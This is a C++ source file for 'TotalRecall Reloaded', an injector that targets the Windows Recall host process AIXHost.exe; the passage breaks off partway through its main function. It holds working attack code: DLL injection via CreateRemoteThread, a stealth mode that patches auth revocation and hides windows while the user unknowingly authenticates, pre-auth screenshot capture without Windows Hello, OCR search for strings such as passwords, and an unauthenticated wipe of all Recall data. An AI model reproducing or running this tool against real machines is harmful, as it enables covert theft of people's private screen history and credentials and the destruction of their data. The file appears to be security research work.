// totalrecall.cpp - TotalRecall Reloaded injector
// Finds/launches AIXHost.exe, injects extraction payload, monitors progress.
// Author: Alexander Hagenah (@xaitax)

#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "shell32.lib")
#pragma comment(lib, "user32.lib")
#pragma comment(lib, "version.lib")

static const wchar_t* TARGET   = L"AIXHost.exe";
static const wchar_t* PAYLOAD  = L"totalrecall_payload.dll";
static const SIZE_T   WS_READY = 80 * 1024 * 1024; // 80MB = Recall UI loaded

static const DWORD INJECT_ACCESS = PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION |
    PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ;

// --- Console colors ---

static HANDLE g_con;

enum { GRAY=8, GREEN=10, CYAN=11, RED=12, YELLOW=14, WHITE=15, RESET=7 };

static void C(int c) { SetConsoleTextAttribute(g_con, (WORD)c); }

static void Separator() { C(GRAY); printf("  ----------------------------------------------------------------\n"); C(RESET); }

static void Msg(int color, char sym, const char* fmt, ...) {
    C(WHITE); printf("  ["); C(color); printf("%c", sym); C(WHITE); printf("] "); C(RESET);
    va_list a; va_start(a, fmt); vprintf(fmt, a); va_end(a);
}

#define Info(...)  Msg(CYAN,  '*', __VA_ARGS__)
#define OK(...)    Msg(GREEN, '+', __VA_ARGS__)
#define Warn(...)  Msg(YELLOW,'!', __VA_ARGS__)
#define Fail(...)  Msg(RED,   'X', __VA_ARGS__)

// --- System info ---

static char g_osBuild[96];

static void DetectOS() {
    HKEY hk;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion",
                      0, KEY_READ, &hk) != ERROR_SUCCESS) {
        strcpy_s(g_osBuild, "Windows"); return;
    }
    DWORD major = 0, ubr = 0, sz;
    char build[32] = {}, ver[32] = {};
    sz = sizeof(DWORD); RegQueryValueExW(hk, L"CurrentMajorVersionNumber", 0, 0, (LPBYTE)&major, &sz);
    sz = sizeof(build); RegQueryValueExA(hk, "CurrentBuildNumber", 0, 0, (LPBYTE)build, &sz);
    sz = sizeof(DWORD); RegQueryValueExW(hk, L"UBR", 0, 0, (LPBYTE)&ubr, &sz);
    sz = sizeof(ver);   RegQueryValueExA(hk, "DisplayVersion", 0, 0, (LPBYTE)ver, &sz);
    RegCloseKey(hk);
    DWORD b = (DWORD)atoi(build);
    int win = (b >= 22000) ? 11 : (int)major;
    if (ver[0]) sprintf_s(g_osBuild, "Windows %d %s (Build %lu.%lu)", win, ver, b, ubr);
    else        sprintf_s(g_osBuild, "Windows %d (Build %lu.%lu)", win, b, ubr);
}

static char g_aixVer[64] = "unknown";

static void GetAIXVersion(DWORD pid) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
    if (snap == INVALID_HANDLE_VALUE) return;
    MODULEENTRY32W me = { sizeof(me) };
    wchar_t exePath[MAX_PATH] = {};
    if (Module32FirstW(snap, &me)) wcscpy_s(exePath, me.szExePath);
    CloseHandle(snap);
    if (!exePath[0]) return;
    DWORD dummy, viSize = GetFileVersionInfoSizeW(exePath, &dummy);
    if (!viSize) return;
    BYTE* vi = (BYTE*)HeapAlloc(GetProcessHeap(), 0, viSize);
    if (GetFileVersionInfoW(exePath, 0, viSize, vi)) {
        VS_FIXEDFILEINFO* ffi = NULL; UINT ffiLen = 0;
        if (VerQueryValueW(vi, L"\\", (void**)&ffi, &ffiLen) && ffi)
            sprintf_s(g_aixVer, "%u.%u.%u.%u",
                HIWORD(ffi->dwFileVersionMS), LOWORD(ffi->dwFileVersionMS),
                HIWORD(ffi->dwFileVersionLS), LOWORD(ffi->dwFileVersionLS));
    }
    HeapFree(GetProcessHeap(), 0, vi);
}

static DWORD FindProc(const wchar_t* name); // forward decl

static void Banner() {
    // Try to get AIXHost version if running
    if (strcmp(g_aixVer, "unknown") == 0) {
        DWORD pid = FindProc(TARGET);
        if (pid) GetAIXVersion(pid);
    }
    C(CYAN);
    printf("\n"
    "  ___________     __         .__ __________                     .__  .__  \n"
    "  \\__    ___/____/  |______  |  |\\______   \\ ____   ____ _____  |  | |  | \n"
    "    |    | /  _ \\   __\\__  \\ |  | |       _// __ \\_/ ___\\\\__  \\ |  | |  | \n"
    "    |    |(  <_> )  |  / __ \\|  |_|    |   \\  ___/\\  \\___ / __ \\|  |_|  |__\n"
    "    |____| \\____/|__| (____  /____/____|_  /\\___  >\\___  >____  /____/____/\n"
    "                           \\/            \\/     \\/     \\/     \\/ \n");
    C(RED); printf("  RELOADED"); C(GRAY); printf("  / Alexander Hagenah / "); C(CYAN); printf("@xaitax\n");
    C(RESET); printf("\n");
    C(GRAY); printf("  OS       "); C(RESET); printf("%s\n", g_osBuild);
    if (strcmp(g_aixVer, "unknown") != 0) {
        C(GRAY); printf("  AIXHost  "); C(RESET); printf("v%s\n", g_aixVer);
    }
    printf("\n");
}

// --- Process helpers ---

static DWORD FindProc(const wchar_t* name) {
    HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (snap == INVALID_HANDLE_VALUE) return 0;
    PROCESSENTRY32W pe = { sizeof(pe) };
    DWORD pid = 0;
    if (Process32FirstW(snap, &pe))
        do { if (_wcsicmp(pe.szExeFile, name) == 0) { pid = pe.th32ProcessID; break; } }
        while (Process32NextW(snap, &pe));
    CloseHandle(snap);
    return pid;
}

static SIZE_T GetWS(DWORD pid) {
    HANDLE h = OpenProcess(PROCESS_QUERY_LIMITED_INFORMATION, FALSE, pid);
    if (!h) return 0;
    typedef BOOL(WINAPI* FnGPMI)(HANDLE, void*, DWORD);
    struct { DWORD cb, pfc; SIZE_T peak, ws, _[6]; } pmc = {}; pmc.cb = sizeof(pmc);
    static FnGPMI fn = (FnGPMI)GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "K32GetProcessMemoryInfo");
    SIZE_T ws = 0;
    if (fn && fn(h, &pmc, sizeof(pmc))) ws = pmc.ws;
    CloseHandle(h);
    return ws;
}

// --- DLL unload / inject ---

static void Unload(DWORD pid) {
    auto pfn = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "FreeLibrary");
    HANDLE hProc = OpenProcess(INJECT_ACCESS, FALSE, pid);
    if (!hProc) return;
    for (int attempt = 0; attempt < 10; attempt++) {
        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE, pid);
        if (snap == INVALID_HANDLE_VALUE) break;
        MODULEENTRY32W me = { sizeof(me) };
        HMODULE hRemote = NULL;
        if (Module32FirstW(snap, &me))
            do { if (_wcsicmp(me.szModule, PAYLOAD) == 0) { hRemote = me.hModule; break; } }
            while (Module32NextW(snap, &me));
        CloseHandle(snap);
        if (!hRemote) break;
        HANDLE ht = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)pfn, hRemote, 0, NULL);
        if (ht) { WaitForSingleObject(ht, 5000); CloseHandle(ht); }
        Sleep(300);
    }
    CloseHandle(hProc);
    Sleep(500);
}

static bool Inject(DWORD pid, const wchar_t* dll) {
    HANDLE hProc = OpenProcess(INJECT_ACCESS, FALSE, pid);
    if (!hProc) return false;
    SIZE_T len = (wcslen(dll) + 1) * sizeof(wchar_t);
    LPVOID mem = VirtualAllocEx(hProc, NULL, len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!mem) { CloseHandle(hProc); return false; }
    WriteProcessMemory(hProc, mem, dll, len, NULL);
    auto loadLib = GetProcAddress(GetModuleHandleW(L"kernel32.dll"), "LoadLibraryW");
    HANDLE ht = CreateRemoteThread(hProc, NULL, 0, (LPTHREAD_START_ROUTINE)loadLib, mem, 0, NULL);
    if (!ht) { VirtualFreeEx(hProc, mem, 0, MEM_RELEASE); CloseHandle(hProc); return false; }
    WaitForSingleObject(ht, 10000);
    CloseHandle(ht);
    CloseHandle(hProc);
    return true;
}

// --- Win+J / window hiding ---

static void SimulateWinJ() {
    keybd_event(VK_LWIN, 0, 0, 0);
    keybd_event('J', 0, 0, 0);
    Sleep(50);
    keybd_event('J', 0, KEYEVENTF_KEYUP, 0);
    keybd_event(VK_LWIN, 0, KEYEVENTF_KEYUP, 0);
}

static BOOL CALLBACK HideWnd(HWND hwnd, LPARAM lParam) {
    DWORD pid; GetWindowThreadProcessId(hwnd, &pid);
    if (pid == (DWORD)lParam && IsWindowVisible(hwnd)) ShowWindow(hwnd, SW_HIDE);
    return TRUE;
}

// --- Monitoring ---

static void FmtSize(UINT64 b, char* out, int n) {
    if (b >= 1024ULL*1024*1024) sprintf_s(out, n, "%.1f GB", (double)b/(1024.0*1024*1024));
    else if (b >= 1024ULL*1024) sprintf_s(out, n, "%.1f MB", (double)b/(1024.0*1024));
    else if (b >= 1024)         sprintf_s(out, n, "%.1f KB", (double)b/1024.0);
    else                        sprintf_s(out, n, "%llu B", (unsigned long long)b);
}

static UINT64 DirSize(const wchar_t* dir) {
    wchar_t pat[MAX_PATH]; swprintf_s(pat, L"%s\\*", dir);
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW(pat, &fd);
    if (h == INVALID_HANDLE_VALUE) return 0;
    UINT64 total = 0;
    do { if (!(fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
             total += ((UINT64)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
    } while (FindNextFileW(h, &fd));
    FindClose(h);
    return total;
}

static UINT64 FileSize(const wchar_t* path) {
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW(path, &fd);
    if (h == INVALID_HANDLE_VALUE) return 0;
    FindClose(h);
    return ((UINT64)fd.nFileSizeHigh << 32) | fd.nFileSizeLow;
}

static int CountFiles(const wchar_t* pattern) {
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW(pattern, &fd);
    if (h == INVALID_HANDLE_VALUE) return 0;
    int n = 0;
    do { n++; } while (FindNextFileW(h, &fd));
    FindClose(h);
    return n;
}

static wchar_t g_extractDir[MAX_PATH];
static FILETIME g_injectTime;

static bool FindExtractDir(const wchar_t* base) {
    wchar_t pat[MAX_PATH]; swprintf_s(pat, L"%s\\extraction_*", base);
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW(pat, &fd);
    if (h == INVALID_HANDLE_VALUE) return false;
    FILETIME newest = {}; wchar_t best[MAX_PATH] = {};
    do {
        if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
            CompareFileTime(&fd.ftCreationTime, &g_injectTime) > 0 &&
            CompareFileTime(&fd.ftCreationTime, &newest) > 0) {
            newest = fd.ftCreationTime;
            wcscpy_s(best, fd.cFileName);
        }
    } while (FindNextFileW(h, &fd));
    FindClose(h);
    if (!best[0]) return false;
    swprintf_s(g_extractDir, L"%s\\%s", base, best);
    return true;
}

static char* ReadLog(const wchar_t* path, char* buf, int sz) {
    buf[0] = 0;
    HANDLE h = CreateFileW(path, GENERIC_READ, FILE_SHARE_READ|FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (h == INVALID_HANDLE_VALUE) return buf;
    LARGE_INTEGER fs; GetFileSizeEx(h, &fs);
    DWORD toRead = (fs.QuadPart < sz - 1) ? (DWORD)fs.QuadPart : sz - 1;
    if (fs.QuadPart > sz - 1) { LARGE_INTEGER sk; sk.QuadPart = fs.QuadPart - sz + 1; SetFilePointerEx(h, sk, 0, FILE_BEGIN); }
    DWORD br = 0; ReadFile(h, buf, toRead, &br, 0); buf[br] = 0;
    CloseHandle(h);
    return buf;
}

static void MonitorAndReport(const wchar_t* baseDir, DWORD startTick, bool preAuth, DWORD timeoutMs = 300000) {
    printf("\n");
    Info("Waiting for extraction to begin");
    for (int i = 0; i < 90 && !FindExtractDir(baseDir); i++) { Sleep(1000); printf("."); }
    printf("\n");
    if (!g_extractDir[0]) { Fail("No extraction directory found\n"); return; }

    wchar_t logPath[MAX_PATH];
    swprintf_s(logPath, L"%s\\extraction.log", g_extractDir);
    char buf[8192];
    bool done = false;
    DWORD lastActive = GetTickCount();
    int total = 0, lastMeta = -1;

    if (!preAuth) Info("Extracting\n");

    while (!done && (GetTickCount() - lastActive) < timeoutMs) {
        Sleep(500);
        ReadLog(logPath, buf, sizeof(buf));
        if (!buf[0]) continue;
        if (strstr(buf, "EXTRACTION COMPLETE")) done = true;

        if (!preAuth) {
            char* p;
            if (total == 0 && (p = strstr(buf, "Context IDs: "))) sscanf(p, "Context IDs: %d", &total);
            char* last = NULL; char* s = buf;
            while ((s = strstr(s, "[progress]"))) { last = s; s += 10; }
            int meta = 0, img = 0, ocr = 0;
            if (last) sscanf(last, "[progress] meta=%d img=%d ocr=%d total=%d", &meta, &img, &ocr, &total);
            if (meta != lastMeta && meta > 0) {
                lastMeta = meta;
                int bw = 30, filled = total > 0 ? (meta * bw / total) : 0;
                if (filled > bw) filled = bw;
                printf("\r  ["); C(GREEN);
                for (int b = 0; b < filled; b++) printf("#");
                C(GRAY);
                for (int b = filled; b < bw; b++) printf("-");
                C(RESET);
                printf("] %d/%d entities          ", meta, total > 0 ? total : meta);
                fflush(stdout);
            }
        }
        lastActive = GetTickCount();
    }
    printf("\n");

    DWORD elapsed = (GetTickCount() - startTick) / 1000;
    Sleep(500);
    ReadLog(logPath, buf, sizeof(buf));

    int mins = elapsed / 60, secs = elapsed % 60;
    printf("\n"); Separator(); printf("\n  ");

    if (preAuth) {
        // Pre-auth report
        wchar_t bmpPath[MAX_PATH]; swprintf_s(bmpPath, L"%s\\latest_capture_4k.bmp", g_extractDir);
        UINT64 bmpSize = FileSize(bmpPath);
        char bmpSzStr[32]; FmtSize(bmpSize, bmpSzStr, sizeof(bmpSzStr));

        char storagePath[512]={}, storageSize[32]={}, retDays[16]={}, capCount[16]={};
        char* p;
        if ((p = strstr(buf, "StoragePath: "))) sscanf(p, "StoragePath: %511[^\n]", storagePath);
        if ((p = strstr(buf, "StorageSize: "))) { UINT64 sz=0; sscanf(p, "StorageSize: %llu", &sz); FmtSize(sz, storageSize, sizeof(storageSize)); }
        if ((p = strstr(buf, "RetentionDays: "))) sscanf(p, "RetentionDays: %15s", retDays);
        if ((p = strstr(buf, "CaptureCount: "))) sscanf(p, "CaptureCount: %15s", capCount);

        C(GREEN); printf("PRE-AUTH EXTRACTION COMPLETE"); C(GRAY); printf("  %d min %d sec\n\n", mins, secs); C(RESET);
        if (bmpSize > 0) { C(WHITE); printf("  Screenshot  "); C(GREEN); printf("4K (3840x2464)"); C(GRAY); printf("  %s\n", bmpSzStr); }
        else              { C(WHITE); printf("  Screenshot  "); C(RED);   printf("Not captured\n"); }
        printf("\n"); C(WHITE); printf("  Settings\n");
        C(GRAY); printf("  %-20s ", "Storage Path"); C(RESET); printf("%s\n", storagePath[0] ? storagePath : "-");
        C(GRAY); printf("  %-20s ", "Storage Size"); C(RESET); printf("%s\n", storageSize[0] ? storageSize : "-");
        C(GRAY); printf("  %-20s ", "Capture Count"); C(RESET); printf("%s\n", capCount[0] ? capCount : "-");
        C(GRAY); printf("  %-20s ", "Retention Days"); C(RESET); printf("%s\n", retDays[0] ? retDays : "-");
    } else {
        // Post-auth report
        int nEnt=0, nOcr=0, nImg=0;
        char* p;
        if ((p = strstr(buf, "Entities: "))) sscanf(p, "Entities: %d", &nEnt);
        if ((p = strstr(buf, "OCR: "))) sscanf(p, "OCR: %d", &nOcr);
        if ((p = strstr(buf, "Screenshots: "))) sscanf(p, "Screenshots: %d", &nImg);

        wchar_t ssDir[MAX_PATH], thDir[MAX_PATH], ocrFile[MAX_PATH], csvFile[MAX_PATH], pat[MAX_PATH];
        swprintf_s(ssDir, L"%s\\screenshots", g_extractDir);
        swprintf_s(thDir, L"%s\\thumbnails", g_extractDir);
        swprintf_s(ocrFile, L"%s\\ocr_text.txt", g_extractDir);
        swprintf_s(csvFile, L"%s\\recall_data.csv", g_extractDir);

        swprintf_s(pat, L"%s\\*.png", ssDir); int nPng = CountFiles(pat);
        swprintf_s(pat, L"%s\\*.png", thDir); int nThumb = CountFiles(pat);

        UINT64 ssSize = DirSize(ssDir), thSize = DirSize(thDir);
        UINT64 ocrSize = FileSize(ocrFile), csvSize = FileSize(csvFile);
        UINT64 totalSize = ssSize + thSize + ocrSize + csvSize;

        char ssSz[32], thSz[32], ocrSz[32], csvSz[32], totalSz[32];
        FmtSize(ssSize, ssSz, 32); FmtSize(thSize, thSz, 32);
        FmtSize(ocrSize, ocrSz, 32); FmtSize(csvSize, csvSz, 32);
        FmtSize(totalSize, totalSz, 32);

        C(GREEN); printf("EXTRACTION COMPLETE"); C(GRAY); printf("  %d min %d sec\n\n", mins, secs); C(RESET);

        C(GRAY); printf("  %-18s %6s %10s\n", "Category", "Count", "Size");
                 printf("  %-18s %6s %10s\n", "------------------", "------", "----------"); C(RESET);
        C(WHITE); printf("  %-18s ", "Screenshots"); C(GREEN); printf("%6d", nPng); C(GRAY); printf(" %10s\n", ssSz);
        if (nThumb > 0) { C(WHITE); printf("  %-18s ", "Thumbnails"); C(GREEN); printf("%6d", nThumb); C(GRAY); printf(" %10s\n", thSz); }
        C(WHITE); printf("  %-18s ", "OCR Text");
        if (nOcr > 0) { C(GREEN); printf("%6d", nOcr); C(GRAY); printf(" %10s\n", ocrSz); }
        else           { C(GRAY); printf("     -          -\n"); }
        C(WHITE); printf("  %-18s ", "Metadata (CSV)"); C(GREEN); printf("%6d", nEnt); C(GRAY); printf(" %10s\n", csvSz);
        C(GRAY); printf("  %-18s %6s %10s\n", "------------------", "------", "----------");
        C(WHITE); printf("  %-18s ", "Total"); C(GREEN); printf("%6d", nEnt); C(WHITE); printf(" %10s\n", totalSz); C(RESET);
    }

    printf("\n"); Separator(); printf("\n");
    C(WHITE); printf("  Output\n"); C(CYAN); printf("  "); wprintf(L"%s\n", g_extractDir);
    C(RESET); printf("\n"); Separator(); printf("\n");
}

// --- Resolve paths relative to exe ---

static void GetBaseAndDll(wchar_t* baseDir, wchar_t* dllPath) {
    GetModuleFileNameW(NULL, dllPath, MAX_PATH);
    wcscpy_s(baseDir, MAX_PATH, dllPath);
    wchar_t* sl = wcsrchr(baseDir, L'\\'); if (sl) *sl = 0;
    sl = wcsrchr(dllPath, L'\\');
    if (sl) wcscpy_s(sl + 1, MAX_PATH - (sl - dllPath + 1), PAYLOAD);
}

static void WriteMarker(const wchar_t* baseDir, const wchar_t* name) {
    wchar_t path[MAX_PATH];
    wcscpy_s(path, baseDir); wcscat_s(path, L"\\"); wcscat_s(path, name);
    FILE* f = _wfopen(path, L"w"); if (f) fclose(f);
}

// --- OCR search ---

static void SearchOCR(const wchar_t* baseDir, const wchar_t* query) {
    // Find most recent extraction directory
    wchar_t pat[MAX_PATH]; swprintf_s(pat, L"%s\\extraction_*", baseDir);
    WIN32_FIND_DATAW fd;
    HANDLE h = FindFirstFileW(pat, &fd);
    if (h == INVALID_HANDLE_VALUE) { Fail("No extraction directories found\n"); return; }
    FILETIME newest = {}; wchar_t best[MAX_PATH] = {};
    do {
        if ((fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) &&
            CompareFileTime(&fd.ftCreationTime, &newest) > 0) {
            newest = fd.ftCreationTime; wcscpy_s(best, fd.cFileName);
        }
    } while (FindNextFileW(h, &fd));
    FindClose(h);
    if (!best[0]) { Fail("No extraction directories found\n"); return; }

    wchar_t dir[MAX_PATH]; swprintf_s(dir, L"%s\\%s", baseDir, best);
    wchar_t ocrFile[MAX_PATH]; swprintf_s(ocrFile, L"%s\\ocr_text.txt", dir);

    // Convert query to narrow for display
    char qNarrow[256]; WideCharToMultiByte(CP_UTF8, 0, query, -1, qNarrow, 256, NULL, NULL);

    C(WHITE); printf("  Searching for: "); C(CYAN); printf("\"%s\"\n", qNarrow);
    C(GRAY); printf("  In: "); wprintf(L"%s\n\n", dir); C(RESET);

    FILE* f = _wfopen(ocrFile, L"r,ccs=UTF-8");
    if (!f) { Fail("No ocr_text.txt found in latest extraction\n"); return; }

    wchar_t line[4096];
    wchar_t context[512] = L"(unknown)";
    int hits = 0;

    while (fgetws(line, 4096, f)) {
        // Track entity context headers: "=== [N] ctxId=... Title | App ==="
        if (wcsncmp(line, L"=== [", 5) == 0) {
            wcscpy_s(context, line);
            // Trim newline
            wchar_t* nl = wcschr(context, L'\n'); if (nl) *nl = 0;
            continue;
        }
        // Case-insensitive search
        wchar_t lower[4096]; wcscpy_s(lower, line); _wcslwr_s(lower);
        wchar_t qLower[256]; wcscpy_s(qLower, query); _wcslwr_s(qLower);
        if (wcsstr(lower, qLower)) {
            hits++;
            C(GREEN); printf("  [%d] ", hits);
            C(GRAY); wprintf(L"%s\n", context);
            C(WHITE); printf("       ");
            // Trim newline from line
            wchar_t* nl = wcschr(line, L'\n'); if (nl) *nl = 0;
            wprintf(L"%s\n\n", line);
            C(RESET);
        }
    }
    fclose(f);

    Separator();
    if (hits > 0) { printf("\n"); OK(""); printf("%d match%s found\n", hits, hits == 1 ? "" : "es"); }
    else           { printf("\n"); Warn("No matches found for \"%s\"\n", qNarrow); }
    printf("\n");
}

// --- Help ---

static void ShowHelp() {
    DetectOS(); Banner(); Separator(); printf("\n");
    C(WHITE); printf("  Usage: "); C(CYAN); printf("totalrecall.exe"); C(RESET); printf(" <mode>\n\n");
    C(WHITE); printf("  Modes:\n\n");
    C(GREEN); printf("    --launch     "); C(RESET); printf("Open Recall via Win+J, prompt Hello, extract all data\n");
    C(GREEN); printf("    --stealth    "); C(RESET); printf("Silent extraction, waits for user to authenticate Recall\n");
    C(GREEN); printf("    --wait       "); C(RESET); printf("Wait for user to manually open Recall, then extract\n");
    C(GREEN); printf("    --preauth    "); C(RESET); printf("Extract pre-auth data only (4K screenshot, no Hello needed)\n");
    C(GREEN); printf("    --search     "); C(RESET); printf("Search extracted OCR text (e.g. --search \"password\")\n");
    C(GREEN); printf("    --destroy    "); C(RESET); printf("Delete ALL Recall data (no Hello required, irreversible!)\n");
    printf("\n"); C(WHITE); printf("  Examples:\n\n"); C(GRAY);
    printf("    totalrecall.exe --launch             Full automated extraction\n");
    printf("    totalrecall.exe --stealth            Silent extraction (patches auth revocation)\n");
    printf("    totalrecall.exe --preauth            Grab latest screenshot without auth\n");
    printf("    totalrecall.exe --search \"password\"   Search OCR for keyword\n");
    printf("    totalrecall.exe --destroy            Wipe all Recall data\n");
    C(RESET); printf("\n"); Separator(); printf("\n");
}

// --- Main ---

int wmain(int argc, wchar_t* argv[]) {
    setvbuf(stdout, NULL, _IONBF, 0);
    g_con = GetStdHandle(STD_OUTPUT_HANDLE);

    enum Mode { NONE, LAUNCH, STEALTH, WAIT, PREAUTH, SEARCH, DESTROY } mode = NONE;
    wchar_t searchQuery[256] = {};
    for (int i = 1; i < argc; i++) {
        if (wcscmp(argv[i], L"--launch")  == 0) mode = LAUNCH;
        if (wcscmp(argv[i], L"--stealth") == 0) mode = STEALTH;
        if (wcscmp(argv[i], L"--wait")    == 0) mode = WAIT;
        if (wcscmp(argv[i], L"--preauth") == 0) mode = PREAUTH;
        if (wcscmp(argv[i], L"--destroy") == 0) mode = DESTROY;
        if (wcscmp(argv[i], L"--search")  == 0) {
            mode = SEARCH;
            if (i + 1 < argc) wcscpy_s(searchQuery, argv[++i]);
        }
        if (wcscmp(argv[i], L"--help") == 0 || wcscmp(argv[i], L"-h") == 0) { ShowHelp(); return 0; }
    }
    if (mode == NONE) { ShowHelp(); return 0; }

    DetectOS();
    wchar_t dllPath[MAX_PATH], baseDir[MAX_PATH];
    GetBaseAndDll(baseDir, dllPath);

    // --search: search OCR text in most recent extraction
    if (mode == SEARCH) {
        if (!searchQuery[0]) { Fail("Usage: --search \"keyword\"\n"); return 1; }
        Banner(); Separator(); printf("\n");
        SearchOCR(baseDir, searchQuery);
        return 0;
    }

    // --destroy: delete all Recall data (pre-auth, no Hello needed)
    if (mode == DESTROY) {
        Banner(); Separator(); printf("\n");
        C(RED); printf("  WARNING: This will permanently delete ALL Windows Recall data.\n");
        printf("  This includes all screenshots, OCR text, and metadata.\n");
        printf("  This action is IRREVERSIBLE and requires NO authentication.\n\n");
        C(YELLOW); printf("  Type 'DESTROY' to confirm: "); C(RESET);
        char confirm[32] = {};
        if (!fgets(confirm, sizeof(confirm), stdin) || strncmp(confirm, "DESTROY", 7) != 0) {
            Info("Aborted.\n\n"); return 0;
        }
        printf("\n");

        DWORD pid = FindProc(TARGET);
        if (!pid) {
            ShellExecuteW(NULL, L"open", L"ms-recall:", NULL, NULL, SW_HIDE);
            for (int i = 0; i < 30 && !pid; i++) { Sleep(500); pid = FindProc(TARGET); }
        }
        if (!pid) { Fail("Could not start AIXHost.exe\n"); return 1; }

        char m[128]; sprintf_s(m, "Target: AIXHost.exe  PID %lu\n", pid); OK(m);
        Sleep(2000);

        // Signal destroy mode
        WriteMarker(baseDir, L"__destroy__");
        Unload(pid);
        Info("Injecting payload...\n");
        if (!Inject(pid, dllPath)) { Fail("Injection failed\n"); return 1; }
        OK("Payload active\n");

        // Wait for destroy to complete
        Sleep(5000);
        C(RED); printf("\n  All Recall data has been destroyed.\n\n"); C(RESET);
        Separator(); printf("\n");
        return 0;
    }

    // --preauth: inject into any AIXHost, grab RPIS screenshot
    if (mode == PREAUTH) {
        DWORD pid = FindProc(TARGET);
        if (!pid) {
            ShellExecuteW(NULL, L"open", L"ms-recall:", NULL, NULL, SW_HIDE);
            for (int i = 0; i < 30 && !pid; i++) { Sleep(500); pid = FindProc(TARGET); }
        }
        if (!pid) { Banner(); Fail("Could not start AIXHost.exe\n"); return 1; }
        Banner(); Separator(); printf("\n");
        char m[128]; sprintf_s(m, "Target: AIXHost.exe  PID %lu (pre-auth mode)\n", pid); OK(m);
        Sleep(2000);
        WriteMarker(baseDir, L"__preauth__");
        DWORD t0 = GetTickCount(); GetSystemTimeAsFileTime(&g_injectTime);
        Unload(pid);
        Info("Injecting payload (pre-auth only)...\n");
        if (!Inject(pid, dllPath)) { Fail("Injection failed\n"); return 1; }
        OK("Payload active\n");
        MonitorAndReport(baseDir, t0, true);
        return 0;
    }

    // --stealth: patch DiscardDataAccess, wait for user to open+close Recall, then extract
    if (mode == STEALTH) {
        DWORD pid = FindProc(TARGET);
        if (!pid) { Banner(); Fail("No AIXHost.exe running.\n"); return 1; }
        GetAIXVersion(pid); Banner(); Separator(); printf("\n");

        char m[128]; sprintf_s(m, "Target: AIXHost.exe  PID %lu (stealth mode)\n", pid); OK(m);
        WriteMarker(baseDir, L"__stealth__");
        DWORD t0 = GetTickCount();
        GetSystemTimeAsFileTime(&g_injectTime);
        Unload(pid);
        if (!Inject(pid, dllPath)) { Fail("Injection failed\n"); return 1; }
        Info("Patching auth revocation...\n");

        // Watch payload log for either:
        // - "AUTH DETECTED": entities were denied, user opened Recall, need to wait for close
        // - "[progress]" or "EXTRACTION COMPLETE": entities already accessible, extracting now
        wchar_t watchLog[MAX_PATH]; g_extractDir[0] = 0;
        for (int i = 0; i < 90 && !FindExtractDir(baseDir); i++) Sleep(1000);
        if (!g_extractDir[0]) { Fail("Payload did not start\n"); return 1; }
        swprintf_s(watchLog, L"%s\\extraction.log", g_extractDir);

        char logBuf[4096];
        bool authSeen = false;
        bool alreadyExtracting = false;

        OK("Waiting for Recall session...\n");
        for (int i = 0; i < 1800; i++) { // up to 30 min
            Sleep(1000);
            ReadLog(watchLog, logBuf, sizeof(logBuf));

            // Path A: grant already cached, payload is extracting directly
            if (strstr(logBuf, "[progress]") || strstr(logBuf, "EXTRACTION COMPLETE")) {
                alreadyExtracting = true;
                OK("Cached session found, extracting...\n");
                break;
            }

            // Path B: entities denied, user opened Recall, auth detected
            if (strstr(logBuf, "AUTH DETECTED")) {
                authSeen = true;
                OK("Recall session detected\n");
                break;
            }

            // Handle AIXHost PID changes (user opened Recall which restarted it)
            DWORD cur = FindProc(TARGET);
            if (cur && cur != pid) {
                pid = cur;
                EnumWindows(HideWnd, (LPARAM)pid);
                WriteMarker(baseDir, L"__stealth__");
                Unload(pid); Inject(pid, dllPath);
            }
        }

        // Path A: already extracting, just monitor
        if (alreadyExtracting) {
            MonitorAndReport(baseDir, t0, false);
            return 0;
        }

        if (!authSeen) { Fail("No Recall session detected within timeout\n"); return 1; }

        // Path B: wait for user to close Recall (AIXHost PID changes)
        Info("Waiting for user to close Recall...\n");
        DWORD authPid = FindProc(TARGET);
        for (int i = 0; i < 300; i++) {
            Sleep(1000);
            DWORD cur = FindProc(TARGET);
            if (!cur || cur != authPid) break;
        }

        // Wait for respawn, inject for extraction (no stealth marker)
        Info("Recall closed, waiting for AIXHost to respawn...\n");
        pid = 0;
        for (int i = 0; i < 30 && !pid; i++) { Sleep(1000); pid = FindProc(TARGET); }
        if (!pid) { Fail("AIXHost did not respawn\n"); return 1; }
        Sleep(2000);
        EnumWindows(HideWnd, (LPARAM)pid);

        sprintf_s(m, "Extracting from AIXHost PID %lu\n", pid); OK(m);
        g_extractDir[0] = 0;
        t0 = GetTickCount(); GetSystemTimeAsFileTime(&g_injectTime);
        Unload(pid);
        if (!Inject(pid, dllPath)) { Fail("Injection failed\n"); return 1; }
        OK("Payload active\n");
        MonitorAndReport(baseDir, t0, false, 1800000);
        return 0;
    }

    // --launch: kill old AIXHost, launch fresh via Win+J
    if (mode == LAUNCH) {
        DWORD old = FindProc(TARGET);
        if (old) {
            HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, old);
            if (h) { TerminateProcess(h, 0); CloseHandle(h); }
            for (int i = 0; i < 20 && FindProc(TARGET); i++) Sleep(250);
            Sleep(1000);
        }
    }

    // --launch / --wait: find or wait for AIXHost
    DWORD pid = FindProc(TARGET);
    if (!pid && mode == LAUNCH) {
        Banner(); Separator(); printf("\n");
